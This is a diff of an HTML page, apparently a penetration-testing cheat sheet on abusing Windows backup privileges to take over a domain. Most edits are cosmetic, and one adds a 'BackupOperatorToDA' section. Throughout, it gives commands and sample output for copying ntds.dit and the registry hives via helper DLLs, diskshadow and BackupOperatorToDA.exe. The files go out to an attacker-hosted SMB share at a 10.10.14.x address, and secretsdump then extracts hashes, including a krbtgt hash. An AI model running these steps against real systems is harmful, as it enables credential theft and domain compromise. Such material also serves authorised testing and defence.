@@ -330,10 +330,10 @@ body.dark-mode #dynamicFormContainer button:hover {
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> For example
 </span></span><span class="line"><span class="cl"><span class="go">robocopy /b &lt;TARGET_DIR_PATH&gt; C:\Windows\Tasks &lt;TARGET_FILE&gt;
 </span></span></span></code></pre></div><hr>
-<h3 id="abuse-2-using-helper-dlls">Abuse #2: Using helper dlls</h3>
+<h3 id="abuse-2-helper-dlls">Abuse #2: Helper dlls</h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">import-module .\SeBackupPrivilegeCmdLets.dll
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">import-module .\SeBackupPrivilegeUtils.dll
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Copy-FileSeBackupPrivilege &lt;TARGET_FILE_PATH&gt; C:\ProgramData\&lt;TARGET_FILE&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Copy-FileSeBackupPrivilege &#39;&lt;TARGET_FILE_PATH&gt;&#39; &#39;C:\ProgramData\&lt;TARGET_FILE&gt;&#39;
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> For example
 </span></span><span class="line"><span class="cl"><span class="go">Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit C:\ProgramData\ntds.dit
 </span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll?raw=true">SeBackupPrivilegeUtils.dll</a></em></small>
@@ -341,7 +341,7 @@ body.dark-mode #dynamicFormContainer button:hover {
 <small><em>Ref: <a href="https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll?raw=true">SeBackupPrivilegeCmdLets.dll</a></em></small></p>
 <hr>
 <h3 id="abuse-3-diskshadow">Abuse #3: Diskshadow</h3>
-<h4 id="1-create-a-dsh-file">1. Create a .dsh file</h4>
+<h4 id="1-create-a-dsh-file">1. Create a .dsh File</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">set context persistent nowriters
 </span></span></span><span class="line"><span class="cl"><span class="go">set metadata C:\ProgramData\test.cab
 </span></span></span><span class="line"><span class="cl"><span class="go">set verbose on
@@ -389,7 +389,7 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">-&gt; %test% = {89fcc72a-ef5d-4fc0-9f6c-c936c3ce6491}
 </span></span></span><span class="line"><span class="cl"><span class="go">The shadow copy was successfully exposed as x:\.
 </span></span></span><span class="line"><span class="cl"><span class="go">-&gt;
-</span></span></span></code></pre></div><h4 id="3-host-a-smb-server-in-linux">3. Host a smb server (In Linux)</h4>
+</span></span></span></code></pre></div><h4 id="3-host-a-smb-server-in-linux">3. Host a SMB Server (In Linux)</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-smbserver share . -smb2support
 </span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> impacket-smbserver share . -smb2support                                  
 </span></span><span class="line"><span class="cl"><span class="go">Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
@@ -398,7 +398,7 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
 </span></span></span><span class="line"><span class="cl"><span class="go">...[SNIP]...
-</span></span></span></code></pre></div><h4 id="4-copy-to-local-linux">4. Copy to local Linux</h4>
+</span></span></span></code></pre></div><h4 id="4-copy-to-local-linux">4. Copy to Local Linux</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">net use \\&lt;LOCAL_IP&gt;\share
 </span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; net use \\10.10.14.31\share
 </span></span></span><span class="line"><span class="cl"><span class="go">The command completed successfully.
@@ -406,7 +406,7 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; Copy-FileSeBackupPrivilege x:\Windows\ntds\ntds.dit \\10.10.14.31\share\ntds.dit
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">reg.exe save hklm\system \\&lt;LOCAL_IP&gt;\share\system
 </span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; reg.exe save hklm\system \\10.10.14.31\share\system
-</span></span></span></code></pre></div><h4 id="5-secrets-dump">5. Secrets dump</h4>
+</span></span></span></code></pre></div><h4 id="5-secrets-dump">5. Secrets Dump</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-secretsdump -ntds ntds.dit -system system LOCAL
 </span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> impacket-secretsdump -ntds ntds.dit -system system LOCAL
 </span></span><span class="line"><span class="cl"><span class="go">Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
@@ -422,6 +422,19 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
 </span></span></span><span class="line"><span class="cl"><span class="go">...[SNIP]...
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Cleaning up...
+</span></span></span></code></pre></div><hr>
+<h3 id="abuse-4-backupoperatortoda">Abuse #4: BackupOperatorToDA</h3>
+<h4 id="1-host-a-smb-server-in-linux">1. Host a SMB Server (In Linux)</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-smbserver share . -smb2support
+</span></span></span></code></pre></div><h4 id="2-copy-hives">2. Copy Hives</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\BackupOperatorToDA.exe -t \\&lt;TARGET_COMPUTER&gt; -u &#39;&lt;USER&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; -d &lt;DOMAIN&gt; -o \\&lt;LOCAL_IP&gt;\share\
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; .\BackupOperatorToDA.exe -t \\DC01 -u user -p &#39;password&#39; -d example.com -o \\10.10.14.2\share\
+</span></span></span><span class="line"><span class="cl"><span class="go">Making user token
+</span></span></span><span class="line"><span class="cl"><span class="go">Dumping SAM hive to \\10.10.14.2\share\SAM
+</span></span></span><span class="line"><span class="cl"><span class="go">Dumping SYSTEM hive to \\10.10.14.2\share\SYSTEM
+</span></span></span><span class="line"><span class="cl"><span class="go">Dumping SECURITY hive to \\10.10.14.2\share\SECURITY
+</span></span></span></code></pre></div><h4 id="3-secrets-dump">3. Secrets Dump</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
 </span></span></span></code></pre></div>
 </div></div>
     
